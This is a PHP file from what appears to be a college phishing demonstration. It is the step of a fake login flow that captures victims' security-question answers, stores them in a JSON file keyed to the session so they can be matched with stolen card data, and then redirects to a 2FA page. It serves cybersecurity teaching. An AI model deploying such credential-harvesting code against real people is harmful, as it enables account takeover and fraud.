<!--
* Educational Phishing Demonstration
* ----------------------------------------
* Programme: AEC Cybersécurité : protection et défense
* 
* Author/Professor: Akram Nasr
* Email: Akram.Nasr@cmontmorency.qc.ca
* 
* IMPORTANT NOTICE:
* This code is created for EDUCATIONAL PURPOSES ONLY to demonstrate 
* phishing techniques and security vulnerabilities as part of 
* cybersecurity education. Using this code for actual phishing
* or any malicious purpose is illegal and unethical.
-->

<?php
session_start(); // Resume session to access session_id
$questionsSubmitted = false;

// Process the security questions form if submitted.
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Collect the security question selections and answers.
    $question1 = $_POST['question1'] ?? '';
    $answer1   = $_POST['answer1']   ?? '';
    $question2 = $_POST['question2'] ?? '';
    $answer2   = $_POST['answer2']   ?? '';
    $question3 = $_POST['question3'] ?? '';
    $answer3   = $_POST['answer3']   ?? '';
    
    // Get the session id to match with the card data.
    $sessionId = session_id();
    $date      = date('Y-m-d H:i:s');

    // Prepare the entry for the security questions.
    $entry = [
        'session_id'  => $sessionId,
        'date'        => $date,
        'question1'   => $question1,
        'answer1'     => $answer1,
        'question2'   => $question2,
        'answer2'     => $answer2,
        'question3'   => $question3,
        'answer3'     => $answer3
    ];

    // Define the JSON file path for security questions.
    $jsonFile = 'data/questions.json';
    $currentData = [];

    // Load current data if file exists.
    if (file_exists($jsonFile)) {
        $jsonStr = file_get_contents($jsonFile);
        $currentData = json_decode($jsonStr, true) ?? [];
    }

    // Append the new security questions entry.
    $currentData[] = $entry;

    // Write back to questions.json with pretty printing.
    file_put_contents($jsonFile, json_encode($currentData, JSON_PRETTY_PRINT));
    
    $questionsSubmitted = true;
    
    // Instead of just setting the flag, redirect to the 2FA page
    header('Location: 2fa.php');
    exit;
}
?>